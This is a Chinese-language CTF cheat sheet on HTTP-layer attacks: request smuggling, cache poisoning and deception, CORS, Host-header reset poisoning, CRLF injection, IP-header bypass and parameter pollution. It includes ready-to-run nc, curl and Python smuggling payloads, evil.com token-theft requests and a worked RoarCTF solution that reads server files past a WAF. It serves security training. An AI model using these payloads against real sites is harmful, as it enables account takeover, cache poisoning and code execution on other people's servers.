# HTTP 层杂项

关键词：HTTP请求走私 请求走私 CL.TE TE.CL 缓存投毒 缓存欺骗 CRLF注入 CORS Host头攻击 参数污染 HPP Web缓存 header注入 响应拆分

## ① 识别指纹

- 响应头出现 `Via`、`X-Cache`、`Age`、`CF-Ray`、`X-Served-By` —— 前面有代理或 CDN
- 附件给 `nginx.conf` / `haproxy.cfg` / `Dockerfile` / `docker-compose.yml` —— 直接看转发与缓存规则
- 题干出现 **缓存 / CDN / 反代 / 代理 / WAF / 走私 / 命中 / 只允许内网访问**
- 一个请求收到两个响应，或第二个请求拿到第一个请求的响应 —— 请求走私
- `X-Cache: HIT`，且改某个 header 能改响应体或跳转地址 —— 缓存投毒
- 有「忘记密码 / 发送重置邮件」，链接域名跟着请求头变 —— Host 头投毒
- 参数被反射进 `Location`、`Set-Cookie` 或自定义响应头 —— CRLF 注入
- 题目名带 **Smuggle / Cache / Poison / Proxy / Header / CDN / Calc**

| 你手里的现象 | 先怀疑 | 去第几条 |
|---|---|---|
| `X-Cache` / `Age` 存在，改 header 能改响应体 | 缓存投毒 | 3 |
| 同一连接上第二个请求收到第一个的响应 | 请求走私 | 7 |
| `/user/..%2fstyle.css` 返回个人页且被缓存 | 缓存欺骗 | 5 |
| `Origin: https://evil.com` 被原样回显 | CORS | 13 |
| 重置邮件里的链接域名跟着 Host 变 | Host 头投毒 | 16 |
| 参数进 `Location` / `Set-Cookie`，能插 `%0d%0a` | CRLF | 18 |
| `?id=1&id=2` 两边行为不一致 | HPP | 20 |

## ② 考什么

- 前端与后端对 HTTP 报文的解析差异（CL、TE、连接复用）
- CL.TE / TE.CL / TE.TE / CL.CL 四种走私形态
- HTTP/2 降级到 HTTP/1.1 时重新引入的歧义（h2.CL / h2.TE）
- 共享缓存、缓存键（cache key）与未 key 化输入（unkeyed input）
- 缓存投毒：`X-Forwarded-Host`、`X-Forwarded-Scheme`、未 key 化 header
- Web 缓存欺骗：路径归一化差异让私有页面落进公共缓存
- CRLF 注入：header 注入、响应拆分、Cookie 固定
- CORS：`Access-Control-Allow-Origin` 反射 + `Allow-Credentials`
- CORS 白名单绕过：后缀匹配、子域、`null` origin
- Host 头攻击：密码重置链接投毒、绝对 URL 生成、缓存投毒
- 访问控制类 header：`X-Forwarded-For`、`X-Real-IP`、`Client-IP`
- HPP：同名参数重复，不同框架取第一个或最后一个

## ③ 判断流程

> 先判拓扑，再选攻击。没有中间层的站，走私和缓存投毒都不成立，直接去 header 类问题。

1. **看响应头判拓扑**：出现 `Via`、`X-Cache`、`Age`、`CF-Ray`，或 `Server` 与 `X-Powered-By` 分属两层 → 有代理/缓存，进 2；全都没有 → 跳 13
2. **测缓存行为**：同一 URL 连发两次，看 `X-Cache` 是否从 `MISS` 变 `HIT`、`Age` 是否增长 → 有共享缓存，进 3；始终 `MISS` 或无缓存头 → 跳 7
3. **测未 key 化 header**：带 `X-Forwarded-Host: evil.com` 和一个随机 `?cb=` 发一次，看响应体/绝对 URL 是否变；再用同一个 `?cb=` 不带 header 发一次 → 第二次仍是投毒版本，缓存投毒成立，进 4；响应没变 → 跳 5
4. **投毒利用**：把反射点换成 XSS 或开放重定向，先带 `?cb=` 自测，再对无参数的真实 URL 投毒；成功 → 结束
5. **测路径归一化**：`/user/..%2fstatic/x.css`、`/user;.css`、`/user%00.css` 各发一次，看缓存键与源站路由是否不一致 → 源站返回个人页且被缓存，缓存欺骗，进 6；无差异 → 跳 7
6. **缓存欺骗利用**：诱导受害者访问构造 URL，等缓存后自己请求同一 URL 取数据；拿到数据 → 结束
7. **测 CL 冲突**：同一请求发两个 `Content-Length`，或 `Content-Length` 与 `Transfer-Encoding: chunked` 同时出现 → 出现延迟、错位或双响应，进 9；前端直接 400 → 进 8
8. **反向测 TE.CL**：`CL` 与 `TE` 同时发且 body 按 chunked 构造，若响应明显延迟 → 后端在等 CL 差额，进 9；不延迟 → 跳 10
9. **同连接验证**：第一包夹带 `GET /404`，第二包发正常请求；第二包收到 404 → 走私成立，进 12；只超时、无错位 → 进 10
10. **HTTP/2 降级**：站点支持 h2 且前面有 CDN → Burp 把协议切到 HTTP/2，加 `transfer-encoding: chunked` 或制造 CL 与 body 不一致，看降级到 h1 后是否复现错位 → 复现，进 12；不复现 → 进 11
11. **TE.TE 混淆**：发两个 `Transfer-Encoding`，一个 `chunked`，另一个用 `xchunked`、大小写、`Transfer-Encoding : chunked`、`chunked\t`，逐个试 → 出现延迟/错位，进 12；全无 → 跳 13
12. **走私利用**：绕过前端访问控制打 `/admin`、污染下一个用户的请求、或配合缓存投毒；拿到 flag → 结束
13. **CORS 探测**：带 `Origin: https://evil.com` 请求接口，看 `Access-Control-Allow-Origin` 是否回显该值 → 回显，进 14；只回 `*` 或无该头 → 跳 15
14. **CORS 利用**：看有没有 `Access-Control-Allow-Credentials: true`；有则起页面 `fetch(url,{credentials:'include'})` 读响应，白名单按后缀/子串匹配时换 `https://t.cn.evil.com`、`https://evilt.cn`、`null`；读出数据 → 结束
15. **本地访问限制**：页面提示只允许 localhost 或返回 403 → 依次加 `X-Forwarded-For: 127.0.0.1`、`X-Real-IP: 127.0.0.1`、`Client-IP`、`X-Originating-IP` → 返回 200 就进后台找 flag，结束；全部无效 → 进 16
16. **Host 头探测**：找绝对 URL 生成点（重置邮件、302、`<link>`、`og:url`），分别改 `Host` 和 `X-Forwarded-Host` 发一次 → 链接域名跟着变，进 17；不变 → 跳 18
17. **重置投毒**：用自己的邮箱请求重置，确认收到的链接指向你的域名；再对管理员邮箱请求一次，从你的服务器收 token；成功 → 结束
18. **CRLF 探测**：参数被反射进 `Location` / `Set-Cookie` 时，插 `%0d%0a` → 出现新 header，进 19；被过滤则试 `%0a`、双重编码、`%E5%98%8A%E5%98%8D`（Unicode CRLF）；都不行 → 跳 20
19. **CRLF 利用**：注入 `Set-Cookie` 固定 session，或注入空行造响应拆分；成功 → 结束
20. **HPP 探测**：同一参数发两次（`?id=1&id=2`），对比应用行为与 WAF 判断 → 应用与 WAF 取值不同，进 21；无差异 → 跳 22
21. **HPP 利用**：在密码重置、角色判断、金额这类参数上重复，让 WAF 放过、应用取恶意值；成功 → 结束
22. **兜底**：以上都不成立 → 回第 1 条，把请求改成 HTTP/2 再发一遍，并检查 `X-Original-URL`、`X-Rewrite-URL` 是否被后端当成路径

## ④ 工具与命令

```bash
# CL.TE：前端按 CL 收包，后端按 TE 收包；必须复用同一条 TCP 连接
# 这里的 38 = "0\r\n\r\n" + "GET /404 HTTP/1.1\r\nHost: t.cn\r\n\r\n" 的字节数
printf 'POST / HTTP/1.1\r\nHost: t.cn\r\nContent-Length: 38\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nHost: t.cn\r\n\r\n' | nc t.cn 80
# 正常会返回两个响应，第二个是 404
```

```bash
# TE.CL：前端按 TE 收包，后端按 CL 收包
# chunk 大小 21(hex)=33 字节，正好是下面那条 GET 请求的长度
printf 'POST / HTTP/1.1\r\nHost: t.cn\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n21\r\nGET /404 HTTP/1.1\r\nHost: t.cn\r\n\r\n0\r\n\r\n' | nc t.cn 80
```

```bash
# 时间延迟法：响应卡住 = 后端在等一个永远不来的分块/字节
printf 'POST / HTTP/1.1\r\nHost: t.cn\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n1\r\nA' | nc -w 10 t.cn 80
printf 'POST / HTTP/1.1\r\nHost: t.cn\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\nX' | nc -w 10 t.cn 80
```

```bash
# 缓存投毒：两次必须用同一个 cb 值，否则命中的不是同一个缓存键
CB=$(date +%s)
curl -si "http://t.cn/?cb=$CB" -H 'X-Forwarded-Host: evil.com' | grep -iE 'x-cache|age:|evil\.com'
curl -si "http://t.cn/?cb=$CB" | grep -iE 'x-cache|age:|evil\.com'
```

```bash
# 缓存欺骗：路径归一化差异
curl -si 'http://t.cn/user/..%2fstatic/x.css' | head -20

# CORS：看 ACAO 是否回显、是否允许 credentials
curl -si 'http://t.cn/api/me' -H 'Origin: https://evil.com' -H 'Cookie: session=...' | grep -i 'access-control'

# Host 头 / 重置链接
curl -si -X POST 'http://t.cn/reset' -H 'Host: evil.com' -d 'email=victim@t.cn'
curl -si -X POST 'http://t.cn/reset' -H 'X-Forwarded-Host: evil.com' -d 'email=victim@t.cn'
# 本地访问限制绕过
curl -si 'http://t.cn/admin' -H 'X-Forwarded-For: 127.0.0.1'

# CRLF：参数反射进 Location / Set-Cookie 时用
curl -si 'http://t.cn/redirect?url=%0d%0aSet-Cookie:%20admin=1' | head -20
# HPP：同名参数重复
curl -si 'http://t.cn/api?role=user&role=admin'
```

```text
# HTTP/2 降级走私（Burp Repeater）：Inspector 切到 HTTP/2 再发
# 前端转 HTTP/1.1 时会重新引入歧义
transfer-encoding: chunked
# 或让 content-length 与 h2 body 长度不一致（h2.CL）
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| 走私重放一次成功、再发就没反应 | 前端 drain 了连接，或后端换了 worker | 每条 payload 新建连接，多试几次 |
| Burp 里改的 CL 总被改回去 | Repeater 自动勾了 Update Content-Length | 在设置里关掉，或改用 raw socket |
| CL 与 TE 同时出现被前端 400 | 前端校验严格 | 换 TE.TE 混淆：大小写、双 TE、`Transfer-Encoding :` |
| `X-Cache: HIT` 但响应没变 | 你改的 header 在缓存键里 | 换 `X-Forwarded-Host`、`X-Host`、`X-Original-URL` 试 |
| 投毒一次就失效 | 缓存过期，或被真实用户刷掉 | 算好 TTL，在过期前完成利用 |
| 投毒内容只有自己能看到 | 响应带 `Set-Cookie`，缓存不落盘 | 找无 cookie 的静态资源做投毒载体 |
| CORS 回显了但不给读 | 没带 `Allow-Credentials: true` | 找带 credentials 的接口，或只读公开数据 |
| `Origin: null` 被拒 | 只做了精确匹配 | 试子域、后缀匹配（`t.cn.evil.com`） |
| 改 Host 没反应 | 应用把域名写死在配置里 | 试 `X-Forwarded-Host`、`X-Original-URL`、绝对 URL 请求行 |
| CRLF 的 `%0d%0a` 被吃 | WAF 只拦了一种编码 | 试 `%0a`、双编码、`%E5%98%8A%E5%98%8D` |
| HPP 两个参数行为一致 | 框架取第一个或合并成一个 | 换框架 / 换参数位置（GET 与 POST 各放一个） |
| 看到 `?%20num=` 这类怪参数名 | 这是 PHP 参数名解析特性，不是走私 | 别把两种绕过混为一谈，分别记录 |

## ⑥ 例题

**题目**：`[RoarCTF 2019] Easy Calc`
**来源**：BUUCTF 复现平台（原题出自 RoarCTF 2019）
**题干**：一个计算器页面，`calc.php?num=1+1`；页面源码注释写着「I've set up WAF to ensure security.」。

**关键观察**：`?num=a` 这种带字母的值会被前端 WAF 直接拦掉，但页面 `show_source` 出来的 PHP 只黑名单了空格、引号、`$`、`[`、`]` 等符号，没有拦字母。说明 WAF 与 PHP 是两层，两层对请求的理解不一致 —— 这正是走私的入口。

**走了哪条链**：第 1 条（响应层判断有独立 WAF）→ 第 7 条（CL 冲突）→ 第 9 条（同连接验证）→ 第 12 条（绕过前端，让后端执行）。

**命令与输出**：

```python
# CL.CL：前端认最后一个 CL（整包放行），后端认第一个 CL（切出第二条请求）；方向反了就交换
import socket

HOST, PORT = "TARGET", 80
smuggled = (
    "POST /calc.php?num=var_dump(scandir(chr(47))) HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Content-Length: 0\r\n"
    "\r\n"
)
body = "num=1\r\n" + smuggled

req = (
    "POST /calc.php?num=1 HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Content-Length: 5\r\n"                 # 后端按这个切
    f"Content-Length: {len(body)}\r\n"      # 前端按这个放行整包
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
)
s = socket.create_connection((HOST, PORT), timeout=5)
s.sendall((req + body).encode())
s.settimeout(3)
out = b""
try:
    while (chunk := s.recv(4096)):
        out += chunk
except socket.timeout:
    pass
print(out.decode("utf-8", "ignore"))
```

第二个响应里能看到 `scandir('/')` 的结果，根目录中有一个 `f1agg`。把 smuggled 那行的 payload 换成按字符拼接的读文件：

```text
file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
```

即 `/f1agg`（`/` 和字母都被前端 WAF 拦，所以全部用 `chr()` 拼）。走私包原样再发一次，第二个响应体里就是 flag 的内容。

**结果**：读到 `/f1agg` 的内容，flag 以原题平台为准。

::: tip flag 说明
本页例题的 flag 随平台和原题版本变化，不在页内固定。练习目标是**判断两层解析差异、验证走私方向**，不是背 payload。
:::
